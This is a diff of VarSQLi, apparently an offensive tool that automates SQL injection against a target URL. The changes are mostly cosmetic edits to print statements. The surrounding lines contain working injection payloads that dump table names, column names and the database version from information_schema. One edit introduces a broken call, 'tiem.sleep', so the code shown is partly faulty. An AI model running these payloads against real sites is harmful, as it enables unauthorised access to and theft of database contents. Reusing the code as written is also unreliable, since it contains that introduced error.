@@ -16,14 +16,7 @@ def banner():
                
 [+] Remember, using VarSQLi or any similar tool for illegal activities can result in severe legal consequences, including imprisonment. It is crucial to prioritize ethical hacking practices, collaborate with security professionals, and comply with relevant laws and regulations to ensure responsible and lawful use of such tools.
 ''')
-
-def payload_file():
-    with open('hello/hello.txt', 'r') as file:
-        content_payload = file.read()
-        print("")
-        print(content_payload)
-payload_file()
-
+banner()
 parser = argparse.ArgumentParser(description='VarSQLi - Auto SQL Injection tools') 
 parser.add_argument('--url', dest='url', help='URL Target (ex : https://test.com/yourpath_vulnsqli.php?id=1)')
 
@@ -762,10 +755,10 @@ if target_url:
                                         print("------------------")
                                         for database_table in database_all:
                                             print(f"[INFO] fetching database on {dbs} ", database_table)
-                                            time.sleep(0.30)
+                                            tiem.sleep(0.30)
                                         for dbmss in database_table:
                                             print('-------------------------')
-                                            print("|", database, end=" | ")
+                                            print(database, end=" | ")
                                             print('-------------------------')
                                         payload_4 = "(SELECT+GROUP_CONCAT(table_name,'::',column_name,'::',version()+SEPARATOR+'<br>')+FROM+information_schema.columns)"
                                         rm = re.sub(r"\b{}\b".format(num_countss), payload_4, payload)
@@ -784,7 +777,7 @@ if target_url:
                                             time.sleep(0.30)
                                         for dbmss in database:
                                             print('-------------------------')
-                                            print("|", database, end=" | ")
+                                            print(database, end=" | ")
                                             print('-------------------------')
                                         payload_4 = "(SELECT+GROUP_CONCAT(table_name,'::',version()+SEPARATOR+'<br>')+FROM+information_schema.tables)"
                                         rm = re.sub(r"\b{}\b".format(num_countss), payload_4, payload)
@@ -803,7 +796,7 @@ if target_url:
                                             time.sleep(0.30)
                                         for dbmss in database:
                                             print('-------------------------')
-                                            print("|", database, end=" | ")
+                                            print(database, end=" | ")
                                             print('-------------------------')
                                         exit()
                                     else:
@@ -1532,7 +1525,7 @@ if target_url:
                                             time.sleep(0.30)
                                         for dbmss in database_table:
                                             print('-------------------------')
-                                            print("|", database, end=" | ")
+                                            print(database, end=" | ")
                                             print('-------------------------')
                                         payload_4 = "(SELECT+GROUP_CONCAT(table_name,'::',column_name,'::',version()+SEPARATOR+'<br>')+FROM+information_schema.columns)"
                                         rm = re.sub(r"\b{}\b".format(num_countss), payload_4, payload)
@@ -1551,7 +1544,7 @@ if target_url:
                                             time.sleep(0.30)
                                         for dbmss in database:
                                             print('-------------------------')
-                                            print("|", database, end=" | ")
+                                            print(database, end=" | ")
                                             print('-------------------------')
                                         payload_4 = "(SELECT+GROUP_CONCAT(table_name,'::',version()+SEPARATOR+'<br>')+FROM+information_schema.tables)"
                                         rm = re.sub(r"\b{}\b".format(num_countss), payload_4, payload)
@@ -1570,7 +1563,7 @@ if target_url:
                                             time.sleep(0.30)
                                         for dbmss in database:
                                             print('-------------------------')
-                                            print("|", database, end=" | ")
+                                            print(database, end=" | ")
                                             print('-------------------------')
                                         exit()
                                     else:
